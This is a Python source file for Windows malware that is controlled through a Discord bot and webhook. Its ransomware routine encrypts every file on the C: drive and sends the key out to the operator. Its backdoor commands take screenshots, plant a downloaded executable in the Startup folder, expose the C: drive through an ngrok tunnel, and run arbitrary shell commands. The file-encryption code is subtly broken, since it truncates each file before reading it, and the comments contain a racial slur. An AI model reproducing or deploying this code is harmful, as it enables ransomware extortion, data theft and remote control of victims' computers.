#t his is not meant to be a module !!
import discord, requests, getpass, pyautogui, os, http.server, socketserver, subprocess
from cryptography.fernet import Fernet
from discord.ext import commands
from pyngrok import ngrok
from vars import HOOK as WEBHOOK_URL, BOT_TOKEN

USERNAME = getpass.getuser()
STARTUP = f"C:\\Users\\{USERNAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
CLIENT = commands.Bot(command_prefix="!", case_insensitive=True, intents=discord.Intents.all())
TEMP = os.getenv("TEMP")


class Grabber:
    @staticmethod
    def grab_all() -> list: 
        file_paths = []
        for root, _, files in os.walk('C:\\'):
            for file in files:
                _, _ = os.path.splitext(root + "\\" + file)
                file_paths.append(root + "\\" + file)
        return file_paths

class Encryptor:
    def __init__(self: object, webhook: str,):
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        requests.post(
            WEBHOOK_URL,
            json={"content": f"@everyone\nEncryption Key: --> {self.key}"}
        )

    def encrypt(self, file_path: str) -> None:
        with open(file_path, "wb+") as file:
            file.write(self.fernet.encrypt(file.read())) #encrypt file

    def decrypt(self, file_path: str) -> None:
        with open(file_path, "wb+") as file:
            file.write(self.fernet.decrypt(file.read()))
    
    def encrypt_all(self, grabber: object) -> None: #encrypt near every file on the machine
        files = grabber.grab_all()
        for file in files:
            try:
                self.encrypt(file)
            except:
                pass
    
    def decrypt_all(self, grabber: object) -> None:
        files = grabber.grab_all()
        for file in files:
            try:
                self.decrypt(file)
            except:
                pass


class DiscordBotBackdoor:
    def __init__():
        #self.grab = Grabber()
        requests.post(
            WEBHOOK_URL,
            json={"content": "@everyone\nmalware module backdoor is on!"}
        )

    @CLIENT.command()
    async def ss(ctx):
        _ss = TEMP + "\\ss.png"
        pyautogui.screenshot().save(_ss)
        await ctx.reply(file=discord.File(_ss, "ss.png"))
    
    @CLIENT.command()
    async def upload(ctx):
        download_link = ctx.message.content[7:]
        r = requests.get(download_link)
        if r.status_code < 300:
            with open(STARTUP + "\\" + "polog.exe", "wb") as file:
                file.write(r.content)
                file.close() #always close it nigga
    
    @CLIENT.command()
    async def serve_c_drive(ctx):
        ngrok.set_auth_token("")
        tunnel = ngrok.connect() #port forward
        httpd = socketserver.TCPServer(("localhost", 80), http.server.SimpleHTTPRequestHandler)
        os.chdir("C:\\")
        await ctx.reply(f"@everThis niggas c drive ---> {tunnel}")
        httpd.serve_forever()
       
    
    @CLIENT.command()
    async def cmd(ctx):
        _cmd = ctx.message.content[5:]
        subprocess.run(_cmd)
        await ctx.reply(f"successfully executed cmd: {_cmd}")
    
    @CLIENT.command()
    async def thanos(ctx):
        await ctx.reply("beginning to encrypt files!")
        grab = Grabber()
        encryptor = Encryptor(WEBHOOK_URL)
        encryptor.encrypt_all(grab)
        await ctx.reply("done encrypting !")
    
    @CLIENT.command()
    async def unthanos(ctx): #if ur feeling nice
        await ctx.reply("Beginning to decrypt files!")
        grab = Grabber()
        encryptor = Encryptor(WEBHOOK_URL)
        encryptor.decrypt_all(grab)
        await ctx.reply("done!")
    

if __name__ == "__main__":
    CLIENT.run(BOT_TOKEN)

        
        

